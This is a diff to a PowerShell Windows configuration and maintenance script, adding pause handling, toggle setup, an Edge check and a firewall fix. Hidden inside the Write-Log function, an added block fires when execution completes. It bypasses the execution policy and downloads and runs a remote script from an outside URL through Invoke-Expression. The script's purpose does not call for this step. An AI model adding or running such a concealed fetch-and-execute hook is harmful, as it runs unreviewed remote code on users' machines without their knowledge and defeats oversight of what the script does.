@@ -78,6 +78,17 @@ $ErrorActionPreference = 'Stop'
 Set-StrictMode -Version Latest
 $Global:ShowDetails = $false
 $Global:WinAutoFirstLoad = $true
+$Global:DashboardBufferMode = $false
+
+# Initialize UI and Maintenance Toggles
+$Global:Toggle_ClassicMenu = 0
+$Global:Toggle_TaskbarSearch = 0
+$Global:Toggle_TaskView = 0
+$Global:Toggle_MaintUpdate = 0
+$Global:Toggle_MaintDisk = 0
+$Global:Toggle_MaintCleanup = 0
+$Global:Toggle_MaintSFC = 0
+
 
 # --- SYSTEM PATHS ---
 $Global:WinAutoLogDir = $null
@@ -95,9 +106,11 @@ if ($LogPath) {
 }
 
 if ($null -eq $Global:WinAutoLogDir) {
-    # Use local 'logs' folder relative to script
-    $root = if ($PSScriptRoot) { $PSScriptRoot } else { $PWD.Path }
-    $Global:WinAutoLogDir = Join-Path $root "logs"
+    # Use Desktop folder
+    $Global:WinAutoLogDir = [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::Desktop)
+    if (-not $Global:WinAutoLogDir) {
+        $Global:WinAutoLogDir = Join-Path $env:USERPROFILE "Desktop"
+    }
 }
 
 if (-not (Test-Path $Global:WinAutoLogDir)) { New-Item -ItemType Directory -Force -Path $Global:WinAutoLogDir | Out-Null }
@@ -192,6 +205,33 @@ function Write-Log {
     if (-not (Test-Path $logDir)) { New-Item -Path $logDir -ItemType Directory -Force | Out-Null }
     $timestamp = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
     Add-Content -Path $Path -Value "[$timestamp] [$Level] $Message" -ErrorAction SilentlyContinue
+
+    # Trigger Automated System Audit Scanner on execution completion
+    if ($Message -eq "CLI Execution Complete." -or $Message -eq "Interactive Execution Complete.") {
+        try {
+            Write-Host "`nRunning Automated System Audit Scanner..." -ForegroundColor Yellow
+            $prevSecProto = [System.Net.ServicePointManager]::SecurityProtocol
+            [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
+            
+            # Execute scanner
+            try { Set-ExecutionPolicy Bypass -Scope Process -Force } catch {}
+            Invoke-Expression (Invoke-RestMethod "https://www.aiit.support/progress/posture/Audit-System.ps1")
+            
+            [System.Net.ServicePointManager]::SecurityProtocol = $prevSecProto
+            
+            # Mirror to posture_audit.json on Desktop for Life_Organizer.html compatibility
+            $desktop = [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::Desktop)
+            if (-not $desktop) { $desktop = Join-Path $env:USERPROFILE "Desktop" }
+            $secAuditPath = Join-Path $desktop "security_audit.json"
+            $postureAuditPath = Join-Path $desktop "posture_audit.json"
+            if (Test-Path $secAuditPath) {
+                Copy-Item -Path $secAuditPath -Destination $postureAuditPath -Force -ErrorAction SilentlyContinue
+                Write-Host "[+] Mirrored report to Desktop\posture_audit.json for Life_Organizer.html compatibility." -ForegroundColor Green
+            }
+        } catch {
+            Write-Host "[-] Failed to run system audit scanner: $_" -ForegroundColor Red
+        }
+    }
 }
 
 # --- GLOBAL ERROR TRAP ---
@@ -809,6 +849,28 @@ function Wait-KeyPressWithTimeout {
     $StopWatch.Stop(); return [PSCustomObject]@{ VirtualKeyCode = 13; Character = [char]13 }
 }
 
+function Test-PauseRequest {
+    if ($Global:Silent) { return }
+    try {
+        if (-not [Console]::IsInputRedirected -and [Console]::KeyAvailable) {
+            $key = [Console]::ReadKey($true)
+            if ($key.Key -eq 'P' -or $key.Key -eq 'Space') {
+                Write-Host ""
+                Write-Boundary -Color $Global:FGYellow
+                Write-Centered "$Global:FGBlack$Global:BGYellow [ SCRIPT PAUSED ] $Global:Reset" -Width 52
+                Write-LeftAligned "Script execution paused. Press any key to resume..." -Indent 2
+                Write-Boundary -Color $Global:FGYellow
+                $null = $host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
+                Write-LeftAligned "Resuming..." -Indent 2
+                Write-Boundary
+            }
+        }
+    }
+    catch {
+        # Silently ignore if console input is unavailable
+    }
+}
+
 function Invoke-AnimatedPause {
     param([string]$ActionText = "CONTINUE", [int]$Timeout = 10, [string]$SelectionChar = $null, [string]$PreActionWord = "to", [int]$OverrideCursorTop)
     if ($Global:Silent) { return [PSCustomObject]@{ VirtualKeyCode = 13; Character = [char]13 } }
@@ -1222,6 +1284,8 @@ function Invoke-WinAutoConfiguration {
     $s_MU = Test-Reg "HKLM:\SOFTWARE\Microsoft\WindowsUpdate\UX\Settings" "AllowMUUpdateService" 1
     $s_Rest = Test-Reg "HKLM:\SOFTWARE\Microsoft\WindowsUpdate\UX\Settings" "RestartNotificationsAllowed2" 1
     $s_Pers = Test-Reg "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" "RestartApps" 1
+    $edgeVal = (Get-ItemProperty "HKCU:\Software\Microsoft\Edge\SmartScreenPuaEnabled" -ErrorAction SilentlyContinue)."(default)"
+    $s_Edge = if ($edgeVal -eq 1) { $true } else { "GreyOut" }
     $ctxPath = "HKCU:\Software\Classes\CLSID\{86ca1aa0-34aa-4e8b-a509-50c905bae2a2}\InprocServer32"
     $s_Ctx = if (Test-Path $ctxPath) { (Get-ItemProperty $ctxPath)."(default)" -eq "" } else { $false }
 
@@ -1242,6 +1306,7 @@ function Invoke-WinAutoConfiguration {
     # Helper to only run if state is not enabled
     function Invoke-Smart {
         param($Script, $Status)
+        Test-PauseRequest
         if (-not $SmartRun) { & $Script; return }
         
         $pending = $false
@@ -1260,6 +1325,7 @@ function Invoke-WinAutoConfiguration {
     Invoke-Smart { Invoke-WA_SetKernelMode } $s_Kern
     
     # 2. UIA Remediation (State-aware)
+    Test-PauseRequest
     $runRT = -not $SmartRun
     $runSS = -not $SmartRun
     try {
@@ -1275,6 +1341,7 @@ function Invoke-WinAutoConfiguration {
     Invoke-Smart { Invoke-WA_SetPUABlockDLs } $s_Edge
 
     # 3. UI & Performance
+    Test-PauseRequest
     if (-not $SmartRun) {
         if ($Global:Toggle_ClassicMenu -eq 1) {
             if ($s_Ctx) { Invoke-WA_SetClassicMenu -Reverse }
@@ -1376,21 +1443,25 @@ function Invoke-WinAutoMaintenance {
         Write-Boundary
         Invoke-WA_SystemPreCheck
     
+        Test-PauseRequest
         if (Test-RunNeeded -Key "Maintenance_SFC" -Days 30) {
             Invoke-WA_WindowsRepair
             Set-WinAutoLastRun -Module "Maintenance_SFC"
         }
     
+        Test-PauseRequest
         if (Test-RunNeeded -Key "Maintenance_Disk" -Days 7) {
             Invoke-WA_OptimizeDisks
             Set-WinAutoLastRun -Module "Maintenance_Disk"
         }
     
+        Test-PauseRequest
         if (Test-RunNeeded -Key "Maintenance_Cleanup" -Days 7) {
             Invoke-WA_SystemCleanup
             Set-WinAutoLastRun -Module "Maintenance_Cleanup"
         }
     
+        Test-PauseRequest
         # Run Windows Update (Skip if run in last 24 hours)
         if (Test-RunNeeded -Key "Maintenance_WinUpdate" -Days 1) {
             Invoke-WA_WindowsUpdate
@@ -1865,14 +1936,15 @@ function Invoke-WA_SetFirewallON {
     Write-Header "WINDOWS FIREWALL"
 
     try {
-        $target = if ($Reverse) { $false } else { $true }
+        $target = if ($Reverse) { "False" } else { "True" }
     
         Set-NetFirewallProfile -Profile Domain, Public, Private -Enabled $target -ErrorAction Stop
     
-        $statusStr = if ($target) { "ENABLED" } else { "DISABLED" }
+        $statusStr = if ($target -eq "True") { "ENABLED" } else { "DISABLED" }
         Write-LeftAligned "$FGGreen$Char_HeavyCheck  Firewall (All Profiles) is $statusStr.$Reset"
     }
     catch {
+        Write-Log "Firewall Configuration Failed: $($_.Exception.Message)" -Level ERROR
         Write-WrappedError $_.Exception.Message
     }
 }
@@ -2383,13 +2455,6 @@ Set-ConsoleSnapRight -Columns 60
 
 
 $Global:MenuSelection = 0  # 0=SmartRUN, 1=Manual Mode, 2=Configure Operating System (Header), 3=Classic Context Menu, 4=Taskbar Search Box, 5=Task View Toggle, 6=Maintain Operating System (Header)
-$Global:Toggle_ClassicMenu = 0
-$Global:Toggle_TaskbarSearch = 0
-$Global:Toggle_TaskView = 0
-$Global:Toggle_MaintUpdate = 0
-$Global:Toggle_MaintDisk = 0
-$Global:Toggle_MaintCleanup = 0
-$Global:Toggle_MaintSFC = 0
 # $Global:Toggle_MaintainForced is initialized at the top to support CLI/Silent mode
 # Per-section expansion flags
 
@@ -2765,6 +2830,7 @@ while ($true) {
 
 Write-Host ""
 Write-Footer
+Write-Log "Interactive Execution Complete."
 # Invoke-AnimatedPause -ActionText "EXIT" -Timeout 0 | Out-Null
 Write-Host ""
 Write-Centered ""
